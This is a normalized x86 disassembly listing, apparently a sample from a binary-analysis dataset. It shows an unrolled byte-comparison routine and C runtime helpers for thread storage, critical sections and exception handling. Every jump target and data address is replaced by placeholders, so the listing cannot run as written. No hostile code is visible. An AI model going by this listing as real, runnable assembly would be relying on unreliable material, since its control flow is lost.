sub edi eax
je r-xdata
xor ecx ecx
test edi edi
setg cl
lea ecx [ ecx * 2 - 0x1 ]
test ecx ecx
jne r-xdata
movzx edi [ esi - 0x15 ]
movzx eax [ edx - 0x15 ]
sub edi eax
je r-xdata
xor ecx ecx
test edi edi
setg cl
lea ecx [ ecx * 2 - 0x1 ]
test ecx ecx
jne r-xdata
movzx edi [ esi - 0x11 ]
movzx eax [ edx - 0x11 ]
sub edi eax
je r-xdata
xor ecx ecx
test edi edi
setg cl
lea ecx [ ecx * 2 - 0x1 ]
test ecx ecx
jne r-xdata
movzx edi [ esi - 0xd ]
movzx eax [ edx - 0xd ]
sub edi eax
je r-xdata
xor ecx ecx
test edi edi
setg cl
lea ecx [ ecx * 2 - 0x1 ]
test ecx ecx
jne r-xdata
movzx eax [ edx - 0x9 ]
movzx edi [ esi - 0x9 ]
sub edi eax
je r-xdata
xor ecx ecx
test edi edi
setg cl
lea ecx [ ecx * 2 - 0x1 ]
test ecx ecx
jne r-xdata
movzx edi [ esi - 0x5 ]
movzx eax [ edx - 0x5 ]
sub edi eax
je r-xdata
xor ecx ecx
test edi edi
setg cl
lea ecx [ ecx * 2 - 0x1 ]
test ecx ecx
jne r-xdata
movzx edi [ esi - 0x1e ]
movzx eax [ edx - 0x1e ]
sub edi eax
je r-xdata
xor ecx ecx
test edi edi
setg cl
lea ecx [ ecx * 2 - 0x1 ]
test ecx ecx
jne r-xdata
movzx edi [ esi - 0x1a ]
movzx eax [ edx - 0x1a ]
sub edi eax
je r-xdata
xor ecx ecx
test edi edi
setg cl
lea ecx [ ecx * 2 - 0x1 ]
test ecx ecx
jne r-xdata
movzx edi [ esi - 0x16 ]
movzx eax [ edx - 0x16 ]
sub edi eax
je r-xdata
xor ecx ecx
test edi edi
setg cl
lea ecx [ ecx * 2 - 0x1 ]
test ecx ecx
jne r-xdata
movzx edi [ esi - 0x12 ]
movzx eax [ edx - 0x12 ]
sub edi eax
je r-xdata
xor ecx ecx
test edi edi
setg cl
lea ecx [ ecx * 2 - 0x1 ]
test ecx ecx
jne r-xdata
movzx edi [ esi - 0xe ]
movzx eax [ edx - 0xe ]
sub edi eax
je r-xdata
xor ecx ecx
test edi edi
setg cl
lea ecx [ ecx * 2 - 0x1 ]
test ecx ecx
jne r-xdata
movzx edi [ esi - 0xa ]
movzx eax [ edx - 0xa ]
sub edi eax
je r-xdata
xor ecx ecx
test edi edi
setg cl
lea ecx [ ecx * 2 - 0x1 ]
test ecx ecx
jne r-xdata
movzx edi [ esi - 0x6 ]
movzx eax [ edx - 0x6 ]
sub edi eax
je r-xdata
xor ecx ecx
test edi edi
setg cl
lea ecx [ ecx * 2 - 0x1 ]
test ecx ecx
jne r-xdata
xor ecx ecx
test edi edi
setg cl
lea ecx [ ecx * 2 - 0x1 ]
jmp r-xdata
mov eax [ esi + 0x8 ]
cmp eax [ edx + 0x8 ]
je r-xdata
movzx edi [ esi + 0x5 ]
movzx eax [ edx + 0x5 ]
sub edi eax
je r-xdata
test edi edi
setg cl
lea ecx [ ecx * 2 - 0x1 ]
test ecx ecx
jne r-xdata
movzx ecx [ esi + 0x3 ]
movzx eax [ edx + 0x3 ]
sub ecx eax
je r-xdata
xor ecx ecx
test edi edi
setg cl
lea ecx [ ecx * 2 - 0x1 ]
test ecx ecx
jne r-xdata
movzx edi [ esi - 0x1a ]
movzx eax [ edx - 0x1a ]
sub edi eax
je r-xdata
xor ecx ecx
test edi edi
setg cl
lea ecx [ ecx * 2 - 0x1 ]
test ecx ecx
jne r-xdata
movzx edi [ esi - 0x16 ]
movzx eax [ edx - 0x16 ]
sub edi eax
je r-xdata
xor ecx ecx
test edi edi
setg cl
lea ecx [ ecx * 2 - 0x1 ]
test ecx ecx
jne r-xdata
movzx edi [ esi - 0x12 ]
movzx eax [ edx - 0x12 ]
sub edi eax
je r-xdata
xor ecx ecx
test edi edi
setg cl
lea ecx [ ecx * 2 - 0x1 ]
test ecx ecx
jne r-xdata
movzx edi [ esi - 0xe ]
movzx eax [ edx - 0xe ]
sub edi eax
je r-xdata
xor ecx ecx
test edi edi
setg cl
lea ecx [ ecx * 2 - 0x1 ]
test ecx ecx
jne r-xdata
movzx edi [ esi - 0xa ]
movzx eax [ edx - 0xa ]
sub edi eax
je r-xdata
xor ecx ecx
test edi edi
setg cl
lea ecx [ ecx * 2 - 0x1 ]
test ecx ecx
jne r-xdata
movzx edi [ esi - 0x6 ]
movzx eax [ edx - 0x6 ]
sub edi eax
je r-xdata
xor ecx ecx
test edi edi
setg cl
lea ecx [ ecx * 2 - 0x1 ]
test ecx ecx
jne r-xdata
movzx edi [ esi - 0x2 ]
movzx eax [ edx - 0x2 ]
sub edi eax
je r-xdata
xor ecx ecx
test edi edi
setg cl
lea ecx [ ecx * 2 - 0x1 ]
test ecx ecx
jne r-xdata
movzx edi [ esi - 0x1b ]
movzx eax [ edx - 0x1b ]
sub edi eax
je r-xdata
xor ecx ecx
test edi edi
setg cl
lea ecx [ ecx * 2 - 0x1 ]
test ecx ecx
jne r-xdata
movzx edi [ esi - 0x17 ]
movzx eax [ edx - 0x17 ]
sub edi eax
je r-xdata
xor ecx ecx
test edi edi
setg cl
lea ecx [ ecx * 2 - 0x1 ]
test ecx ecx
jne r-xdata
movzx edi [ esi - 0x13 ]
movzx eax [ edx - 0x13 ]
sub edi eax
je r-xdata
xor ecx ecx
test edi edi
setg cl
lea ecx [ ecx * 2 - 0x1 ]
test ecx ecx
jne r-xdata
movzx edi [ esi - 0xf ]
movzx eax [ edx - 0xf ]
sub edi eax
je r-xdata
xor ecx ecx
test edi edi
setg cl
lea ecx [ ecx * 2 - 0x1 ]
test ecx ecx
jne r-xdata
movzx edi [ esi - 0xb ]
movzx eax [ edx - 0xb ]
sub edi eax
je r-xdata
xor ecx ecx
test edi edi
setg cl
lea ecx [ ecx * 2 - 0x1 ]
test ecx ecx
jne r-xdata
movzx edi [ esi - 0x7 ]
movzx eax [ edx - 0x7 ]
sub edi eax
je r-xdata
xor ecx ecx
test edi edi
setg cl
lea ecx [ ecx * 2 - 0x1 ]
test ecx ecx
jne r-xdata
movzx edi [ esi - 0x3 ]
movzx eax [ edx - 0x3 ]
sub edi eax
je r-xdata
xor ecx ecx
test edi edi
setg cl
lea ecx [ ecx * 2 - 0x1 ]
test ecx ecx
jne r-xdata
movzx edi [ esi - 0x1c ]
movzx eax [ edx - 0x1c ]
sub edi eax
je r-xdata
xor ecx ecx
test edi edi
setg cl
lea ecx [ ecx * 2 - 0x1 ]
test ecx ecx
jne r-xdata
movzx edi [ esi - 0x18 ]
movzx eax [ edx - 0x18 ]
sub edi eax
je r-xdata
xor ecx ecx
test edi edi
setg cl
lea ecx [ ecx * 2 - 0x1 ]
test ecx ecx
jne r-xdata
movzx edi [ esi - 0x14 ]
movzx eax [ edx - 0x14 ]
sub edi eax
je r-xdata
xor ecx ecx
test edi edi
setg cl
lea ecx [ ecx * 2 - 0x1 ]
test ecx ecx
jne r-xdata
movzx edi [ esi - 0x10 ]
movzx eax [ edx - 0x10 ]
sub edi eax
je r-xdata
xor ecx ecx
test edi edi
setg cl
lea ecx [ ecx * 2 - 0x1 ]
test ecx ecx
jne r-xdata
movzx edi [ esi - 0xc ]
movzx eax [ edx - 0xc ]
sub edi eax
je r-xdata
xor ecx ecx
test edi edi
setg cl
lea ecx [ ecx * 2 - 0x1 ]
test ecx ecx
jne r-xdata
movzx eax [ edx - 0x8 ]
movzx edi [ esi - 0x8 ]
sub edi eax
je r-xdata
xor ecx ecx
test edi edi
setg cl
lea ecx [ ecx * 2 - 0x1 ]
test ecx ecx
jne r-xdata
movzx edi [ esi - 0x4 ]
movzx eax [ edx - 0x4 ]
sub edi eax
je r-xdata
xor ecx ecx
test edi edi
setg cl
lea ecx [ ecx * 2 - 0x1 ]
test ecx ecx
jne r-xdata
movzx edi [ esi - 0x1d ]
movzx eax [ edx - 0x1d ]
sub edi eax
je r-xdata
xor ecx ecx
test edi edi
setg cl
lea ecx [ ecx * 2 - 0x1 ]
test ecx ecx
jne r-xdata
movzx edi [ esi - 0x19 ]
movzx eax [ edx - 0x19 ]
sub edi eax
je r-xdata
xor ecx ecx
test edi edi
setg cl
lea ecx [ ecx * 2 - 0x1 ]
test ecx ecx
jne r-xdata
movzx edi [ esi - 0x15 ]
movzx eax [ edx - 0x15 ]
sub edi eax
je r-xdata
xor ecx ecx
test edi edi
setg cl
lea ecx [ ecx * 2 - 0x1 ]
test ecx ecx
jne r-xdata
movzx edi [ esi - 0x11 ]
movzx eax [ edx - 0x11 ]
sub edi eax
je r-xdata
xor ecx ecx
test edi edi
setg cl
lea ecx [ ecx * 2 - 0x1 ]
test ecx ecx
jne r-xdata
movzx edi [ esi - 0xd ]
movzx eax [ edx - 0xd ]
sub edi eax
je r-xdata
xor ecx ecx
test edi edi
setg cl
lea ecx [ ecx * 2 - 0x1 ]
test ecx ecx
jne r-xdata
movzx edi [ esi - 0x9 ]
movzx eax [ edx - 0x9 ]
sub edi eax
je r-xdata
xor ecx ecx
test edi edi
setg cl
lea ecx [ ecx * 2 - 0x1 ]
test ecx ecx
jne r-xdata
movzx edi [ esi - 0x5 ]
movzx eax [ edx - 0x5 ]
sub edi eax
je r-xdata
xor ecx ecx
test edi edi
setg cl
lea ecx [ ecx * 2 - 0x1 ]
test ecx ecx
jne r-xdata
test ecx ecx
jne r-xdata
xor ecx ecx
movzx edi al
movzx eax [ edx + 0x8 ]
sub edi eax
je r-xdata
movzx edi [ esi + 0x6 ]
movzx eax [ edx + 0x6 ]
sub edi eax
je r-xdata
xor ecx ecx
test edi edi
setg cl
lea ecx [ ecx * 2 - 0x1 ]
test ecx ecx
jne r-xdata
test ecx ecx
jne r-xdata
xor eax eax
test ecx ecx
setg al
lea ecx [ eax * 2 - 0x1 ]
jmp r-xdata
movzx ecx [ esi - 0x19 ]
movzx eax [ edx - 0x19 ]
sub ecx eax
je r-xdata
xor ecx ecx
test edi edi
setg cl
lea ecx [ ecx * 2 - 0x1 ]
test ecx ecx
jne r-xdata
movzx ecx [ esi - 0x15 ]
movzx eax [ edx - 0x15 ]
sub ecx eax
je r-xdata
xor ecx ecx
test edi edi
setg cl
lea ecx [ ecx * 2 - 0x1 ]
test ecx ecx
jne r-xdata
movzx ecx [ esi - 0x11 ]
movzx eax [ edx - 0x11 ]
sub ecx eax
je r-xdata
xor ecx ecx
test edi edi
setg cl
lea ecx [ ecx * 2 - 0x1 ]
test ecx ecx
jne r-xdata
movzx ecx [ esi - 0xd ]
movzx eax [ edx - 0xd ]
sub ecx eax
je r-xdata
xor ecx ecx
test edi edi
setg cl
lea ecx [ ecx * 2 - 0x1 ]
test ecx ecx
jne r-xdata
movzx ecx [ esi - 0x9 ]
movzx eax [ edx - 0x9 ]
sub ecx eax
je r-xdata
xor ecx ecx
test edi edi
setg cl
lea ecx [ ecx * 2 - 0x1 ]
test ecx ecx
jne r-xdata
movzx ecx [ esi - 0x5 ]
movzx eax [ edx - 0x5 ]
sub ecx eax
je r-xdata
xor ecx ecx
test edi edi
setg cl
lea ecx [ ecx * 2 - 0x1 ]
test ecx ecx
jne r-xdata
movzx ecx [ esi - 0x1 ]
movzx eax [ edx - 0x1 ]
sub ecx eax
je r-xdata
xor ecx ecx
test edi edi
setg cl
lea ecx [ ecx * 2 - 0x1 ]
test ecx ecx
jne r-xdata
movzx ecx [ esi - 0x1a ]
movzx eax [ edx - 0x1a ]
sub ecx eax
je r-xdata
xor ecx ecx
test edi edi
setg cl
lea ecx [ ecx * 2 - 0x1 ]
test ecx ecx
jne r-xdata
movzx ecx [ esi - 0x16 ]
movzx eax [ edx - 0x16 ]
sub ecx eax
je r-xdata
xor ecx ecx
test edi edi
setg cl
lea ecx [ ecx * 2 - 0x1 ]
test ecx ecx
jne r-xdata
movzx ecx [ esi - 0x12 ]
movzx eax [ edx - 0x12 ]
sub ecx eax
je r-xdata
xor ecx ecx
test edi edi
setg cl
lea ecx [ ecx * 2 - 0x1 ]
test ecx ecx
jne r-xdata
movzx ecx [ esi - 0xe ]
movzx eax [ edx - 0xe ]
sub ecx eax
je r-xdata
xor ecx ecx
test edi edi
setg cl
lea ecx [ ecx * 2 - 0x1 ]
test ecx ecx
jne r-xdata
movzx ecx [ esi - 0xa ]
movzx eax [ edx - 0xa ]
sub ecx eax
je r-xdata
xor ecx ecx
test edi edi
setg cl
lea ecx [ ecx * 2 - 0x1 ]
test ecx ecx
jne r-xdata
movzx ecx [ esi - 0x6 ]
movzx eax [ edx - 0x6 ]
sub ecx eax
je r-xdata
xor ecx ecx
test edi edi
setg cl
lea ecx [ ecx * 2 - 0x1 ]
test ecx ecx
jne r-xdata
movzx ecx [ esi - 0x2 ]
movzx eax [ edx - 0x2 ]
sub ecx eax
je r-xdata
xor ecx ecx
test edi edi
setg cl
lea ecx [ ecx * 2 - 0x1 ]
test ecx ecx
jne r-xdata
movzx ecx [ esi - 0x1b ]
movzx eax [ edx - 0x1b ]
sub ecx eax
je r-xdata
xor ecx ecx
test edi edi
setg cl
lea ecx [ ecx * 2 - 0x1 ]
test ecx ecx
jne r-xdata
movzx ecx [ esi - 0x17 ]
movzx eax [ edx - 0x17 ]
sub ecx eax
je r-xdata
xor ecx ecx
test edi edi
setg cl
lea ecx [ ecx * 2 - 0x1 ]
test ecx ecx
jne r-xdata
movzx ecx [ esi - 0x13 ]
movzx eax [ edx - 0x13 ]
sub ecx eax
je r-xdata
xor ecx ecx
test edi edi
setg cl
lea ecx [ ecx * 2 - 0x1 ]
test ecx ecx
jne r-xdata
movzx ecx [ esi - 0xf ]
movzx eax [ edx - 0xf ]
sub ecx eax
je r-xdata
xor ecx ecx
test edi edi
setg cl
lea ecx [ ecx * 2 - 0x1 ]
test ecx ecx
jne r-xdata
movzx ecx [ esi - 0xb ]
movzx eax [ edx - 0xb ]
sub ecx eax
je r-xdata
xor ecx ecx
test edi edi
setg cl
lea ecx [ ecx * 2 - 0x1 ]
test ecx ecx
jne r-xdata
movzx eax [ edx - 0x7 ]
movzx ecx [ esi - 0x7 ]
sub ecx eax
je r-xdata
xor ecx ecx
test edi edi
setg cl
lea ecx [ ecx * 2 - 0x1 ]
test ecx ecx
jne r-xdata
movzx ecx [ esi - 0x3 ]
movzx eax [ edx - 0x3 ]
sub ecx eax
je r-xdata
xor ecx ecx
test edi edi
setg cl
lea ecx [ ecx * 2 - 0x1 ]
test ecx ecx
jne r-xdata
movzx ecx [ esi - 0x1c ]
movzx eax [ edx - 0x1c ]
sub ecx eax
je r-xdata
xor ecx ecx
test edi edi
setg cl
lea ecx [ ecx * 2 - 0x1 ]
test ecx ecx
jne r-xdata
movzx ecx [ esi - 0x18 ]
movzx eax [ edx - 0x18 ]
sub ecx eax
je r-xdata
xor ecx ecx
test edi edi
setg cl
lea ecx [ ecx * 2 - 0x1 ]
test ecx ecx
jne r-xdata
movzx ecx [ esi - 0x14 ]
movzx eax [ edx - 0x14 ]
sub ecx eax
je r-xdata
xor ecx ecx
test edi edi
setg cl
lea ecx [ ecx * 2 - 0x1 ]
test ecx ecx
jne r-xdata
movzx ecx [ esi - 0x10 ]
movzx eax [ edx - 0x10 ]
sub ecx eax
je r-xdata
xor ecx ecx
test edi edi
setg cl
lea ecx [ ecx * 2 - 0x1 ]
test ecx ecx
jne r-xdata
movzx ecx [ esi - 0xc ]
movzx eax [ edx - 0xc ]
sub ecx eax
je r-xdata
xor ecx ecx
test edi edi
setg cl
lea ecx [ ecx * 2 - 0x1 ]
test ecx ecx
jne r-xdata
movzx ecx [ esi - 0x8 ]
movzx eax [ edx - 0x8 ]
sub ecx eax
je r-xdata
xor ecx ecx
test edi edi
setg cl
lea ecx [ ecx * 2 - 0x1 ]
test ecx ecx
jne r-xdata
movzx ecx [ esi - 0x4 ]
movzx eax [ edx - 0x4 ]
sub ecx eax
je r-xdata
xor ecx ecx
test edi edi
setg cl
lea ecx [ ecx * 2 - 0x1 ]
test ecx ecx
jne r-xdata
mov eax [ esi + 0xc ]
cmp eax [ edx + 0xc ]
je r-xdata
movzx edi [ esi + 0x9 ]
movzx eax [ edx + 0x9 ]
sub edi eax
je r-xdata
test edi edi
setg cl
lea ecx [ ecx * 2 - 0x1 ]
test ecx ecx
jne r-xdata
movzx ecx [ esi + 0x7 ]
movzx eax [ edx + 0x7 ]
sub ecx eax
je r-xdata
xor ecx ecx
test edi edi
setg cl
lea ecx [ ecx * 2 - 0x1 ]
test ecx ecx
jne r-xdata
test ecx ecx
jne r-xdata
xor eax eax
test ecx ecx
setg al
lea ecx [ eax * 2 - 0x1 ]
jmp r-xdata
test ecx ecx
jne r-xdata
xor eax eax
test ecx ecx
setg al
lea ecx [ eax * 2 - 0x1 ]
jmp r-xdata
test ecx ecx
jne r-xdata
xor eax eax
test ecx ecx
setg al
lea ecx [ eax * 2 - 0x1 ]
jmp r-xdata
test ecx ecx
jne r-xdata
xor eax eax
test ecx ecx
setg al
lea ecx [ eax * 2 - 0x1 ]
jmp r-xdata
test ecx ecx
jne r-xdata
xor eax eax
test ecx ecx
setg al
lea ecx [ eax * 2 - 0x1 ]
jmp r-xdata
test ecx ecx
jne r-xdata
xor eax eax
test ecx ecx
setg al
lea ecx [ eax * 2 - 0x1 ]
jmp r-xdata
test ecx ecx
jne r-xdata
xor eax eax
test ecx ecx
setg al
lea ecx [ eax * 2 - 0x1 ]
jmp r-xdata
test ecx ecx
jne r-xdata
xor eax eax
test ecx ecx
setg al
lea ecx [ eax * 2 - 0x1 ]
jmp r-xdata
test ecx ecx
jne r-xdata
xor eax eax
test ecx ecx
setg al
lea ecx [ eax * 2 - 0x1 ]
jmp r-xdata
test ecx ecx
jne r-xdata
xor eax eax
test ecx ecx
setg al
lea ecx [ eax * 2 - 0x1 ]
jmp r-xdata
test ecx ecx
jne r-xdata
xor eax eax
test ecx ecx
setg al
lea ecx [ eax * 2 - 0x1 ]
jmp r-xdata
test ecx ecx
jne r-xdata
xor eax eax
test ecx ecx
setg al
lea ecx [ eax * 2 - 0x1 ]
jmp r-xdata
test ecx ecx
jne r-xdata
xor eax eax
test ecx ecx
setg al
lea ecx [ eax * 2 - 0x1 ]
jmp r-xdata
xor eax eax
test ecx ecx
setg al
lea ecx [ eax * 2 - 0x1 ]
jmp r-xdata
test ecx ecx
jne r-xdata
xor eax eax
test ecx ecx
setg al
lea ecx [ eax * 2 - 0x1 ]
jmp r-xdata
test ecx ecx
jne r-xdata
xor eax eax
test ecx ecx
setg al
lea ecx [ eax * 2 - 0x1 ]
jmp r-xdata
test ecx ecx
jne r-xdata
xor eax eax
test ecx ecx
setg al
lea ecx [ eax * 2 - 0x1 ]
jmp r-xdata
test ecx ecx
jne r-xdata
xor eax eax
test ecx ecx
setg al
lea ecx [ eax * 2 - 0x1 ]
jmp r-xdata
test ecx ecx
jne r-xdata
xor eax eax
test ecx ecx
setg al
lea ecx [ eax * 2 - 0x1 ]
jmp r-xdata
test ecx ecx
jne r-xdata
xor eax eax
test ecx ecx
setg al
lea ecx [ eax * 2 - 0x1 ]
jmp r-xdata
test ecx ecx
jne r-xdata
xor eax eax
test ecx ecx
setg al
lea ecx [ eax * 2 - 0x1 ]
jmp r-xdata
test ecx ecx
jne r-xdata
xor eax eax
test ecx ecx
setg al
lea ecx [ eax * 2 - 0x1 ]
jmp r-xdata
test ecx ecx
jne r-xdata
xor eax eax
test ecx ecx
setg al
lea ecx [ eax * 2 - 0x1 ]
jmp r-xdata
test ecx ecx
jne r-xdata
xor eax eax
test ecx ecx
setg al
lea ecx [ eax * 2 - 0x1 ]
jmp r-xdata
test ecx ecx
jne r-xdata
xor eax eax
test ecx ecx
setg al
lea ecx [ eax * 2 - 0x1 ]
jmp r-xdata
test ecx ecx
jne r-xdata
xor eax eax
test ecx ecx
setg al
lea ecx [ eax * 2 - 0x1 ]
jmp r-xdata
test ecx ecx
jne r-xdata
xor eax eax
test ecx ecx
setg al
lea ecx [ eax * 2 - 0x1 ]
jmp r-xdata
test ecx ecx
jne r-xdata
xor eax eax
test ecx ecx
setg al
lea ecx [ eax * 2 - 0x1 ]
jmp r-xdata
xor ecx ecx
movzx edi al
movzx eax [ edx + 0xc ]
sub edi eax
je r-xdata
movzx edi [ esi + 0xa ]
movzx eax [ edx + 0xa ]
sub edi eax
je r-xdata
xor ecx ecx
test edi edi
setg cl
lea ecx [ ecx * 2 - 0x1 ]
test ecx ecx
jne r-xdata
test ecx ecx
jne r-xdata
xor eax eax
test ecx ecx
setg al
lea ecx [ eax * 2 - 0x1 ]
jmp r-xdata
mov eax [ esi + 0x10 ]
cmp eax [ edx + 0x10 ]
je r-xdata
movzx edi [ esi + 0xd ]
movzx eax [ edx + 0xd ]
sub edi eax
je r-xdata
test edi edi
setg cl
lea ecx [ ecx * 2 - 0x1 ]
test ecx ecx
jne r-xdata
movzx ecx [ esi + 0xb ]
movzx eax [ edx + 0xb ]
sub ecx eax
je r-xdata
xor ecx ecx
test edi edi
setg cl
lea ecx [ ecx * 2 - 0x1 ]
test ecx ecx
jne r-xdata
xor ecx ecx
movzx eax [ edx + 0x10 ]
movzx edi [ esi + 0x10 ]
sub edi eax
je r-xdata
movzx edi [ esi + 0xe ]
movzx eax [ edx + 0xe ]
sub edi eax
je r-xdata
xor ecx ecx
test edi edi
setg cl
lea ecx [ ecx * 2 - 0x1 ]
test ecx ecx
jne r-xdata
test ecx ecx
jne r-xdata
xor eax eax
test ecx ecx
setg al
lea ecx [ eax * 2 - 0x1 ]
jmp r-xdata
mov eax [ esi + 0x14 ]
cmp eax [ edx + 0x14 ]
je r-xdata
movzx edi [ esi + 0x11 ]
movzx eax [ edx + 0x11 ]
sub edi eax
je r-xdata
test edi edi
setg cl
lea ecx [ ecx * 2 - 0x1 ]
test ecx ecx
jne r-xdata
movzx ecx [ esi + 0xf ]
movzx eax [ edx + 0xf ]
sub ecx eax
je r-xdata
xor ecx ecx
test edi edi
setg cl
lea ecx [ ecx * 2 - 0x1 ]
test ecx ecx
jne r-xdata
xor ecx ecx
movzx edi al
movzx eax [ edx + 0x14 ]
sub edi eax
je r-xdata
movzx edi [ esi + 0x12 ]
movzx eax [ edx + 0x12 ]
sub edi eax
je r-xdata
xor ecx ecx
test edi edi
setg cl
lea ecx [ ecx * 2 - 0x1 ]
test ecx ecx
jne r-xdata
test ecx ecx
jne r-xdata
xor eax eax
test ecx ecx
setg al
lea ecx [ eax * 2 - 0x1 ]
jmp r-xdata
mov eax [ esi + 0x18 ]
cmp eax [ edx + 0x18 ]
je r-xdata
movzx edi [ esi + 0x15 ]
movzx eax [ edx + 0x15 ]
sub edi eax
je r-xdata
test edi edi
setg cl
lea ecx [ ecx * 2 - 0x1 ]
test ecx ecx
jne r-xdata
movzx ecx [ esi + 0x13 ]
movzx eax [ edx + 0x13 ]
sub ecx eax
je r-xdata
xor ecx ecx
test edi edi
setg cl
lea ecx [ ecx * 2 - 0x1 ]
test ecx ecx
jne r-xdata
xor ecx ecx
movzx edi al
movzx eax [ edx + 0x18 ]
sub edi eax
je r-xdata
movzx edi [ esi + 0x16 ]
movzx eax [ edx + 0x16 ]
sub edi eax
je r-xdata
xor ecx ecx
test edi edi
setg cl
lea ecx [ ecx * 2 - 0x1 ]
test ecx ecx
jne r-xdata
test ecx ecx
jne r-xdata
xor eax eax
test ecx ecx
setg al
lea ecx [ eax * 2 - 0x1 ]
jmp r-xdata
mov eax [ esi + 0x1c ]
cmp eax [ edx + 0x1c ]
je r-xdata
movzx edi [ esi + 0x19 ]
movzx eax [ edx + 0x19 ]
sub edi eax
je r-xdata
test edi edi
setg cl
lea ecx [ ecx * 2 - 0x1 ]
test ecx ecx
jne r-xdata
movzx ecx [ esi + 0x17 ]
movzx eax [ edx + 0x17 ]
sub ecx eax
je r-xdata
xor ecx ecx
test edi edi
setg cl
lea ecx [ ecx * 2 - 0x1 ]
test ecx ecx
jne r-xdata
xor ecx ecx
movzx edi al
movzx eax [ edx + 0x1c ]
sub edi eax
je r-xdata
movzx edi [ esi + 0x1a ]
movzx eax [ edx + 0x1a ]
sub edi eax
je r-xdata
xor ecx ecx
test edi edi
setg cl
lea ecx [ ecx * 2 - 0x1 ]
test ecx ecx
jne r-xdata
test ecx ecx
jne r-xdata
xor eax eax
test ecx ecx
setg al
lea ecx [ eax * 2 - 0x1 ]
jmp r-xdata
push 0x20
pop ecx
sub ebx ecx
add esi ecx
add edx ecx
cmp ebx ecx
jae r-xdata
movzx edi [ esi + 0x1d ]
movzx eax [ edx + 0x1d ]
sub edi eax
je r-xdata
test edi edi
setg cl
lea ecx [ ecx * 2 - 0x1 ]
test ecx ecx
jne r-xdata
movzx ecx [ esi + 0x1b ]
movzx eax [ edx + 0x1b ]
sub ecx eax
je r-xdata
xor ecx ecx
test edi edi
setg cl
lea ecx [ ecx * 2 - 0x1 ]
test ecx ecx
jne r-xdata
movzx edi [ esi + 0x1e ]
movzx eax [ edx + 0x1e ]
sub edi eax
je r-xdata
xor ecx ecx
test edi edi
setg cl
lea ecx [ ecx * 2 - 0x1 ]
test ecx ecx
jne r-xdata
test ecx ecx
jne r-xdata
xor eax eax
test ecx ecx
setg al
lea ecx [ eax * 2 - 0x1 ]
jmp r-xdata
movzx ecx [ esi + 0x1f ]
movzx eax [ edx + 0x1f ]
sub ecx eax
je r-xdata
xor ecx ecx
test edi edi
setg cl
lea ecx [ ecx * 2 - 0x1 ]
test ecx ecx
jne r-xdata
test ecx ecx
jne r-xdata
xor eax eax
test ecx ecx
setg al
lea ecx [ eax * 2 - 0x1 ]
jmp r-xdata
sub_4134da
cmp [ rw-data ] 0xffffffff
jne r-xdata
push ebx
push edi
call [ GetLastError@IAT ]
push [ rw-data ]
mov edi eax
call sub_410f12
mov ebx eax
pop ecx
cmp ebx 0xffffffff
je r-xdata
xor eax eax
retn
xor ebx ebx
jmp r-xdata
test ebx ebx
jne r-xdata
push edi
call [ SetLastError@IAT ]
pop edi
mov eax ebx
pop ebx
retn
push 0xffffffff
push [ rw-data ]
call sub_410f4c
pop ecx
pop ecx
test eax eax
jne r-xdata
push esi
push 0x28
push 0x1
call sub_41942e
mov esi eax
pop ecx
pop ecx
test esi esi
je r-xdata
xor ebx ebx
push ebx
push [ rw-data ]
call sub_410f4c
pop ecx
pop ecx
jmp r-xdata
push esi
push [ rw-data ]
call sub_410f4c
pop ecx
pop ecx
test eax eax
jne r-xdata
push esi
call sub_41a3a5
pop ecx
pop esi
mov ebx esi
xor esi esi
sub_41356c
push sub_4134b0
call sub_410e9e
mov [ rw-data ] eax
pop ecx
cmp eax 0xffffffff
jne r-xdata
push rw-data
push eax
call sub_410f4c
pop ecx
pop ecx
test eax eax
jne r-xdata
xor al al
retn
mov al 0x1
retn
call sub_41359f
jmp r-xdata
sub_4135c0
push ebp
mov ebp esp
sub esp 0x4
push ebx
push ecx
mov eax [ ebp + 0xc ]
add eax 0xc
mov [ ebp - 0x4 ] eax
mov eax [ ebp + 0x8 ]
push ebp
push [ ebp + 0x10 ]
mov ecx [ ebp + 0x10 ]
mov ebp [ ebp - 0x4 ]
call sub_41390c
push esi
push edi
call eax
pop edi
pop esi
mov ebx ebp
pop ebp
mov ecx [ ebp + 0x10 ]
push ebp
mov ebp ebx
cmp ecx 0x100
jne r-xdata
push ecx
call sub_41390c
pop ebp
pop ecx
pop ebx
leave
retn 0xc
mov ecx 0x2
sub_413629
push esi
push edi
mov edi rw-data
xor esi esi
call sub_413665
xor al al
inc [ rw-data ]
add esi 0x18
add edi 0x18
cmp esi 0x18
jb r-xdata
push 0x0
push 0xfa0
push edi
call sub_410f89
add esp 0xc
test eax eax
je r-xdata
mov al 0x1
jmp r-xdata
pop edi
pop esi
retn
sub_413665
push esi
mov esi [ rw-data ]
test esi esi
je r-xdata
mov al 0x1
pop esi
retn
imul eax esi 0x18
push edi
lea edi [ eax + rw-data ]
push edi
call [ DeleteCriticalSection@IAT ]
dec [ rw-data ]
sub edi 0x18
sub esi 0x1
jne r-xdata
pop edi
sub_4136a0
push ebx
push esi
push edi
mov edx [ esp + 0x10 ]
mov eax [ esp + 0x14 ]
mov ecx [ esp + 0x18 ]
push ebp
push edx
push eax
push ecx
push ecx
push sub_413730
push [ fs : 0x0 ]
mov eax [ rw-data ]
xor eax esp
mov [ esp + 0x8 ] eax
mov [ fs : 0x0 ] esp
pop [ fs : 0x0 ]
add esp 0x18
pop edi
pop esi
pop ebx
retn
mov edx [ esp + 0x34 ]
cmp edx 0xfffffffe
je r-xdata
lea esi [ esi + esi * 2 ]
lea ebx [ ebx + esi * 4 + 0x10 ]
mov ecx [ ebx ]
mov [ eax + 0xc ] ecx
cmp [ ebx + 0x4 ] 0x0
jne r-xdata
cmp esi edx
jbe r-xdata
mov eax [ esp + 0x30 ]
mov ebx [ eax + 0x8 ]
mov ecx [ esp + 0x2c ]
xor ebx [ ecx ]
mov esi [ eax + 0xc ]
cmp esi 0xfffffffe
je r-xdata
push 0x101
mov eax [ ebx + 0x8 ]
call sub_413915
mov ecx 0x1
mov eax [ ebx + 0x8 ]
call sub_413934
jmp r-xdata
sub_413730
mov ecx [ esp + 0x4 ]
test [ ecx + 0x4 ] 0x6
mov eax 0x1
je r-xdata
retn
mov eax [ esp + 0x8 ]
mov ecx [ eax + 0x8 ]
xor ecx eax
call sub_40d56a
push ebp
mov ebp [ eax + 0x18 ]
push [ eax + 0xc ]
push [ eax + 0x10 ]
push [ eax + 0x14 ]
call sub_4136a0
add esp 0xc
pop ebp
mov eax [ esp + 0x8 ]
mov edx [ esp + 0x10 ]
mov [ edx ] eax
mov eax 0x3
sub_413776
push ebp
push [ esp + 0x8 ]
call sub_401f50
add esp 0x4
mov ecx [ esp + 0x8 ]
mov ebp [ ecx ]
push [ ecx + 0x1c ]
